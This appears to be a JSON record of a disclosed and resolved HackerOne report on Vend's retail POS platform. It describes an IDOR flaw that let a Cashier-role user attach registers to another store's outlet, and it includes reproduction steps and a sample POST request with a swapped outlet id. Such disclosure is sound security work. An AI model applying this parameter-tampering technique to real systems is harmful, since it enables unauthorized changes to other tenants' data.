@@ -1,0 +1,131 @@
+{
+  "id": 317332,
+  "global_id": "Z2lkOi8vaGFja2Vyb25lL1JlcG9ydC8zMTczMzI=",
+  "url": "https://hackerone.com/reports/317332",
+  "title": "Improper access control on adding a Register to an Outlet",
+  "state": "Closed",
+  "substate": "resolved",
+  "severity_rating": "medium",
+  "readable_substate": "Resolved",
+  "created_at": "2018-02-18T11:40:29.315Z",
+  "submitted_at": "2018-02-18T11:40:29.315Z",
+  "is_member_of_team?": false,
+  "is_organization_group_member?": false,
+  "reporter": {
+    "disabled": false,
+    "username": "al88nsk",
+    "url": "/al88nsk",
+    "profile_picture_urls": {
+      "small": "https://hackerone.com/rails/active_storage/representations/redirect/eyJfcmFpbHMiOnsiZGF0YSI6MTM4MzIzMiwicHVyIjoiYmxvYl9pZCJ9fQ==--514c8f56da24d394b18d6e27f0009685ee7b1e04/eyJfcmFpbHMiOnsiZGF0YSI6eyJmb3JtYXQiOiJqcGciLCJncmF2aXR5IjoiQ2VudGVyIiwicmVzaXplIjoiNjJ4NjJeIiwiY3JvcCI6IjYyeDYyKzArMCJ9LCJwdXIiOiJ2YXJpYXRpb24ifX0=--2de8067d228529d65848a4eeed0bed0bb2531bc3/7403122_0.jpg"
+    },
+    "is_me?": false,
+    "cleared": false,
+    "verified": false,
+    "hackerone_triager": false,
+    "hacker_mediation": false
+  },
+  "team": {
+    "id": 20545,
+    "url": "https://hackerone.com/vend_vdp",
+    "handle": "vend_vdp",
+    "profile_picture_urls": {
+      "small": "https://profile-photos.hackerone-user-content.com/variants/000/020/545/a775382b6cc2ea39dd205cec8a8c6217a6165aae_original./235acf2ba808c3a51a94888fb977392c26f8fb0ccf77a81a4546c5e4065c06f1",
+      "medium": "https://profile-photos.hackerone-user-content.com/variants/000/020/545/a775382b6cc2ea39dd205cec8a8c6217a6165aae_original./3f1ab5c6a9b6dadada1e6c8121700b884388bd0a43471fee1897a38ce57d0b2c"
+    },
+    "permissions": [],
+    "submission_state": "disabled",
+    "default_currency": "usd",
+    "awards_miles": false,
+    "offers_bounties": false,
+    "state": "public_mode",
+    "only_cleared_hackers": false,
+    "pentest_feature_enabled?": false,
+    "pentest_retesting_ends_at": null,
+    "profile": {
+      "name": "Vend VDP",
+      "twitter_handle": "vendhq",
+      "website": "https://www.vendhq.com",
+      "about": "Vend is retail POS software, inventory management, ecommerce & customer loyalty for iPad, Mac and PC. Easily manage & grow your business in the cloud."
+    }
+  },
+  "has_bounty?": false,
+  "can_view_team": true,
+  "can_view_report": true,
+  "is_external_bug": false,
+  "is_published": false,
+  "is_participant": false,
+  "has_collaborators": false,
+  "submitted_by_team_member": false,
+  "submitted_with_assistant": false,
+  "stage": 4,
+  "public": true,
+  "visibility": "full",
+  "cve_ids": [],
+  "singular_disclosure_disabled": true,
+  "disclosed_at": "2018-05-02T03:43:35.646Z",
+  "bug_reporter_agreed_on_going_public_at": "2018-05-02T03:43:35.575Z",
+  "team_member_agreed_on_going_public_at": "2018-05-02T03:00:40.773Z",
+  "comments_closed?": false,
+  "facebook_team?": false,
+  "team_private?": false,
+  "vulnerability_information": "**Summary:** User without permissions to add a Register to an Outlet can bypass this restriction and add a Register to an Outlet.\n\n**Description:** I do not know which permission exactly controls this action, I tested this against default `Cashier` role. User with default `Cashier` role has no permission to add registers.  If a user creates his own store on `vendhq.com` then he can add a Register to an Outlet.\n\n## Steps To Reproduce:\n\n  1. Add a user to store A with `Cashier` role. Assume the added user's email is attacker@attacker.com\n  2. Go to `Setup` -> `Outlets and Registers`\n  3. Create an outlet in store A\n  4. Create a new store B using email attacker@attacker.com\n  5. Log in to store B with attacker@attacker.com credentials\n  6. Create an outlet in store B\n  7. Run Burp Suite or any other proxy to intercept requests\n  8. Add a register to outlet in store B and intercept outgoing POST request\n  9. Replace id in `vend_register%5Boutlet_id%5D=<outlet id>` from the request with id of outlet from store A and process the request\n  10. Check outlet from store A - a register should be added to it\n\nRequest example\n\n```\nPOST /register/create/outlet_id/<outled id from B> HTTP/1.1\nHost: <store B>.vendhq.com\nUser-Agent: Mozilla/5.0 (Windows NT 10.0; Win64; x64; rv:58.0) Gecko/20100101 Firefox/58.0\nAccept: text/html,application/xhtml+xml,application/xml;q=0.9,*/*;q=0.8\nAccept-Language: en-US,en;q=0.5\nAccept-Encoding: gzip, deflate\nReferer: https://<store B>.vendhq.com/register/<outled id from B>/new?confirmed=1\nContent-Type: application/x-www-form-urlencoded\nContent-Length: 694\nCookie: <Cookie>\nDNT: 1\nConnection: close\nUpgrade-Insecure-Requests: 1\n\nvend_register%5Bid%5D=&vend_register%5Boutlet_id%5D=<outled id from A>&vend_register%5B_csrf_token%5D=<csrf token>&vend_register%5Bname%5D=6&vend_register%5Bcash_managed_payment_id%5D=<cash managed payment id>&vend_register%5Breceipt_template_id%5D=<receipt template id>&vend_register%5Binvoice_sequence%5D=1&vend_register%5Binvoice_prefix%5D=&vend_register%5Binvoice_suffix%5D=&vend_register%5Bask_for_user_on_sale%5D=0&vend_register%5Bemail_receipt%5D=1&vend_register%5Bprint_receipt%5D=1&vend_register%5Bask_for_note_on_save%5D=1&vend_register%5Bprint_note_on_receipt%5D=1&vend_register%5Bshow_discounts%5D=1&return=\n```\n\nCashier can get id of interesting outlet from `Sales Ledger` page source.\n\n## Impact\n\nAn attacker can add registers to outlets even if he has no permissions to do it.",
+  "weakness": {
+    "id": 55,
+    "name": "Insecure Direct Object Reference (IDOR)"
+  },
+  "original_report_id": null,
+  "original_report_url": null,
+  "attachments": [],
+  "allow_singular_disclosure_at": null,
+  "vote_count": 14,
+  "voters": [
+    "jokebookservice1",
+    "wargsec",
+    "base_64",
+    "2026",
+    "kunal94",
+    "whitesector",
+    "eveeez",
+    "pr0f0x01",
+    "rashedul_css",
+    "japz",
+    "and 4 more..."
+  ],
+  "severity": {
+    "rating": "medium",
+    "score": 4.9,
+    "author_type": "Team",
+    "metrics": {
+      "attack_vector": "network",
+      "attack_complexity": "high",
+      "privileges_required": "low",
+      "user_interaction": "none",
+      "scope": "changed",
+      "confidentiality": "none",
+      "integrity": "low",
+      "availability": "low"
+    }
+  },
+  "structured_scope": {
+    "databaseId": 547,
+    "asset_type": "URL",
+    "asset_identifier": "your-store.vendhq.com",
+    "max_severity": "critical"
+  },
+  "abilities": {
+    "assignable_team_members": [],
+    "assignable_team_member_groups": []
+  },
+  "summaries": [
+    {
+      "category": "team",
+      "can_view?": true,
+      "can_create?": false
+    },
+    {
+      "category": "researcher",
+      "can_view?": true,
+      "can_create?": false
+    }
+  ]
+}
